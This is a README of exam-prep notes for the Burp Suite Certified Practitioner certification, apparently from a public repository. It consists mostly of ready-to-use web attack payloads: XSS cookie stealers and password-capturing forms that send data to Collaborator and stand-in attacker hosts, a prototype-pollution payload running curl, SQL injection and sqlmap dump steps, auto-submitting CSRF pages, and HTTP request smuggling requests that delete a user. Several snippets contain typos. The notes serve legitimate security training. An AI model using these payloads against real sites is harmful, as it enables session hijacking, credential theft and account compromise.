# BSCP_Notes
Notes for Burp Suite Certified Practitioner

- The repository is for learning purpose only
- The payloads and attack patterns defined here should only be used in ethical way
- Make sure you use these notes as a guide only
- Try to make your own customized notes
- There are 4 xmind files which consist of exploit techniques, payloads, tips techniques for cracking the exam:
  - Advance Topics
  - Server-Side Vulnerabilities
  - Client-Side Vulnerabilities
  - Tools and payloads for the exam

## Authentication Bypassing

### 2FA Authentication bypass by relying on a single parameter to send the 2FA code.

With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed.
    Log out of your account.
    Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos.
    Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
    Send the POST /login2 request to Burp Intruder.
    In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code.
    Load the 302 response in the browser.
    Click My account to solve the lab.


## XSS Paylodas for stealing cookies

### Exploits for stealing cookie via XSS
If you find these exploits as applicable, make sure to try with both:
- Exploit server
- COLLABORATOR  

### Using fetch method and defining the POST Method

`<script>
fetch('https://burpcollaborator.net', {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>`

### Using fetch method

`<script>
fetch('https://collaborator.net/?x='+document.cookie);
</script>`

### XSS Cookie Stealer payloads using JavaScript

`JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie`

### Reflected XSS into HTML context with nothing encoded in search.

`<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>`

### Reflected DOM XSS, into JSON data that is processed by eval().

`\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//`

### JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.

`${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}`

### AngularJS DOM XSS Attack constructor payloads

`{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}``

### Web Cache Parameter cloaking - script /js/geolocate.js, executing the callback function setCountryCookie()

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//`

Or something like this:

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=fetch('https://fm5j9cc16vel2tzyiahicza4fvlm9db10.oastify.com/?secertcookie='+document.cookie)`
### More Cross-Site Scripting (XSS) example cookie stealer payloads.

`<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>`

### HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.

`&'><img src=1 onerror=print()>`
`&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>`
`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>`

### Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
Document.write

/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script>
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest();
                    req.onload = reqListener;
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true);
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>

<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  });
</script>
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```

### OSCP Offsec PWK hand book cookie stealer example

`<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>`

### Alt Cookie Stealer

```
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Steal Password / Cookie Stealer ::::

#### XMLHttpRequest

```
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

#### FETCH API

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### DATA EXFILTRATION / COOKIE STEALER ::::

```
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script>
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```

### IFRAMEs

```
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

### Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

`ocument.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`

### Prompt Validation payload, does not steal cookie or send it to exploit server.

`<img src=x onerror=prompt(1)>`

## Remote code execution via server-side prototype pollution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
## SQL Injection

### SQL Injection guessing the number of columns

Using order by, start by 1 and then keep on adding until you can an error, example for oracle based on input:
`'ORDER+BY+1--`

If order by does not work send null column names or random names, second example is work oracle as dual is a default table in oracle, modify the query based on the db type:
`'UNION+SELECT+NULL,NULL--`
`'UNION+SELECT+'cc','acc'+FROM+dual--`

### Getting table names

## In oracle based on number of columns getting table names
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

## In orables based on table names and number of columns getting column names
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QXLDOX'--`

## In Oracle based on number of columsn retrieving column data
`'+UNION+SELECT+PASSWORD_XWPKPI,USERNAME_QCONIL+FROM+USERS_QXLDOX--`

### SQLMAP workflow

In the dev Tools, copy the request you want to attack as curl and then paste it as the payloads like:

```
sqlmap -u '<copied data>'  -p <parameter you want to attack> --batch
```

Other useful commands to follow after getting some basic info, this flows from getting the database information, then getting table names, etc.
`--flush-session --dbms postgresql --technique E --level 5`

and now modify the command to dump out dbms: 
 `--dbms postgresql --technique E --level 5 --dbs`

  Now get the tables about the database: 

`--dbms postgresql --technique E --level 5 -D public --tables`

Now retrieve info about the users:
`--dbms postgresql --technique E --level 5 -D public --T users --dump`

## CSRF

### CSRF normal payload with parameters set

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <form id="csrfForm" action="https://vulnerable-website.com/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="_csrf" value="malicious_csrf_token">
    </form>
    <script>
        // Automatically submit the form when the page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`

### CSRF with header payload using xhr post request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://vulnerable-website.com/transfer", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("X-Custom-Header", "<possible XSS attack vector>"); // Custom header set by attacker
        xhr.send("amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token");
    </script>
</body>`

### CSRF with header payload using xhr get request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://vulnerable-website.com/transfer?amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token", true);
        xhr.setRequestHeader("X-Custom-Header", "custom_value"); // Custom header set by attacker
        xhr.send();
    </script>
</body>
</html>`


## Exam Payloads that you might have missed

There were http request smuggling findings plus xss through UA, something like this and then practicing this should have been useful

```
POST / HTTP/1.1
Host: 0a0100e303b540ff81ae1b90002500df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 225

0

GET /post?postId=2 HTTP/1.1
User-Agent: 6"/><script>fetch('https://0lm48xbm5gd61eyjhvg3bk9pegk78y3ms.oastify.com/?x='+document.cookie);</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

## CORS

### CORS Attack with XSS and trusted SUBDOMAIN

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

The application responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. there can be a possibility that the trsuted domain is itself vulnerable to xss, which can be used for XSS.
Observe that the productID parameter is vulnerable to XSS.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
Example: https://portswigger.net/web-security/cors/lab-breaking-https-attack


# HTTP Request Smuggling Testing Guide

This guide provides a comprehensive flow for testing various types of HTTP request smuggling vulnerabilities, including both HTTP/1.1 and HTTP/2 scenarios.

What can you do with it?
- smuggle a request through a normal request, which would be blocked under normal circumstances, that response will be queued and when you send any other request you will be served that responses
- If there is a reflected XSS, then you can use the second request to be in the queue and the response will be served to a user who visits the website next, you can use fetch payload to get cookie
- Again you can queue a response and if a user who has signed up will be served up their response, and their response which may contain cookie will be served up to you and then you can use that cookie, to sign in 

## Flow Chart for Testing HTTP Request Smuggling

### 1. Start

### 2. Identify HTTP Version Used
- **Action**: Determine if the server is using HTTP/1.1 or HTTP/2.
- **Tools**: Burp Suite, Wireshark, browser developer tools.
- **Payloads**:
  - Check the server response headers to confirm the HTTP version.
  - Example 1 (HTTP/1.1):
```
    POST / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2 (HTTP/2):
```
    GET / HTTP/2.0
    Host: vulnerable-website.com
```

### 3. Check for HTTP Request Smuggling Vulnerability
- **Action**: Test this only if HTTP /1.1downgrade was possible. Identify potential vulnerability to HTTP request smuggling if you cant downgrade following steps 5,6,7
- **Tools**: Burp Suite, manual HTTP request crafting.
- **Payloads**:
  - Example 1:
```
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 44
    Transfer-Encoding: chunked

    0

    GET / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2:
```
    GET / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 12

    GET /malicious HTTP/1.1
    Host: vulnerable-website.com
```

### 4. Test for HTTP/1.1 Smuggling Types

#### TE.CL (Transfer-Encoding: chunked and Content-Length)
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 24
Connection: keep-alive

f
48luu=x&t0gj3=x
bd
POST /jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g HTTP/1.1
Host: jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g.oastify.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
Expected Behavior:

The server may process the GET /malicious request separately after processing the initial POST request.

Lab payload:

```
POST / HTTP/1.1
Host: 0a4900ca03eed89283a2417400f400f2.web-security-academy.net
Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4
Connection: keep-alive

b9
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### CL.TE (Content-Length and Transfer-Encoding: chunked)
Testing payload

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

```


Expected Behavior:

The server may interpret the content length and transfer encoding inconsistently, leading to request smuggling.

Lab:

Testing if front end is CL and TE at the back end, you should get error in the second request:
```
POST / HTTP/1.1
Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

x
```

Then testing more and eventually deleting the user carlos
```
POST / HTTP/1.1
Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

x=1
```
Similar to the above scenario but you need cookie in the first request:
```
POST / HTTP/1.1
Host: 0a86002903006fa381fb5928002200c0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=RYtijcE8jZ7l4EeoWQrfQek4EyXFiIdD
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
### TE.TE (Transfer-Encoding: chunked twice)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable-website.com
```
Expected Behavior:

The server may incorrectly handle the repeated transfer encoding headers, resulting in request smuggling.

### 5. Test for HTTP/2 Smuggling Types

### H2.CL (HTTP/2 with Content-Length)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13

GET /malicious HTTP/2.0
Host: attacker-website.com
```

Expected Behavior:

The server may misinterpret the Content-Length header and process the injected request separately.

### H2.TE (HTTP/2 with Transfer-Encoding)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net\r\n
\r\n
```
Expected Behavior:

The server may handle the Transfer-Encoding header incorrectly, leading to request smuggling.
If the repeated request gets you 404 that means that request was smuggled

In lab, you can try to smuggle /admin request and see if you get 200 and then try to perform actions accordingly or in real scenario try to retrieve a cookie:
```
POST / HTTP/2
Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net


```

### H2.CL

H2.CL request smuggling: The lab is vulnerable to front end downgrade, this time we will use CL for the downgrade, and provide an ambigious CL length, to perform the attack we will need to exploit the user by redirecting them to an exploit page which causes javascript to execute and cause an alert popup, we will need to first find a request that is redirecting the user just based on that request and adding the host header initially, this will be /resources. if we send a request to the app with any host header and with /resources it will just append to the host header for redirect, we can use our exploit server for this and then save the exploit under /resources. Final pyalod:
```
POST / HTTP/2
Host: 0a93009b037290338009cb7e001b00e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0ac80049032f90ff8073ca6e018d00dd.exploit-server.net
Content-Length: 5

x=1
```
Make sure you dont include /r/n in the final line so that next header is appended to it from the user.

### CL.0

Similar to above scenario but you smuggle the request with proper content length only and then
with payload, it can be found through the auto scanner
Example to delete the user carlos:

```
GET /resources/labheader/js/labHeader.js HTTP/2
Host: 0a9b0064031c4edf83f2a60a000e0067.web-security-academy.net
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Cache-Control: max-age=0
Cookie: session=EbAnLZFZvgWw44sm6uAgycRJXYaI3gzu
Upgrade-Insecure-Requests: 1
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"
Sec-Ch-Ua-Platform: Windows
Sec-Ch-Ua-Mobile: ?0
Content-Length: 27

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

### 6. Test for HTTP/2 Request Smuggling via CRLF Injection
Testing:
```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13
X-Injected-Header: value\r\nTransfer-Encoding: chunked

0

SMUGGLED
```
```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13
X-Injected-Header: value\r\nTransfer-Encoding: chunked

0

malicious request
```

### 7. Test for HTTP/2 Request Splitting via CRLF Injection

```
GET /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
User-Agent: legitimate-user-agent
X-Injected-Header: value\r\nGET /malicious HTTP/2.0\r\nHost: attacker-website.com\r\n\r\n
```

Expected Behavior:

The server may split the request and process the injected GET /malicious HTTP/2.0 as a separate request.

### 8. Observe Server Responses

Monitor for signs of smuggling:
Split requests
Delayed responses
Unexpected responses using Burp Suite, server logs, and HTTP response analysis.

### 9. Confirm Exploitable Vulnerabilities

Verify if the observed behavior can be exploited using various payloads to determine the extent of the vulnerability.
